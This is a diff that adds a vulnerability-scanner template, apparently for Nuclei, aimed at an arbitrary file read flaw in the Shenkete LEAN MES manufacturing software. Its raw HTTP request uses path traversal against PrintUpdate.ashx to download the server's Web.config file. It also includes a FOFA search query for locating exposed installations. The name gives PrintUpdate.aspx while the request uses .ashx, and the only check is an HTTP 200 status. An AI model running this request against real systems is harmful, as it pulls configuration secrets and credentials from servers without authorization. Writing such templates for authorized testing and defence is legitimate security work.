@@ -1,0 +1,29 @@
+id: poc-le876eqoksbnyg92
+info:
+  name: 深科特LEAN MES PrintUpdate.aspx存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/le876eqoksbnyg92'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: le876eqoksbnyg92
+    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
+http:
+- raw:
+  - 'GET /Handler/PrintUpdate.ashx?action=DownLoadFile&file=..%2F..%2FWeb.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
+
+    Accept: */*
+
+    Connection: Keep-Alive
+
+    Content-Type: application/x-www-form-urlencoded'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
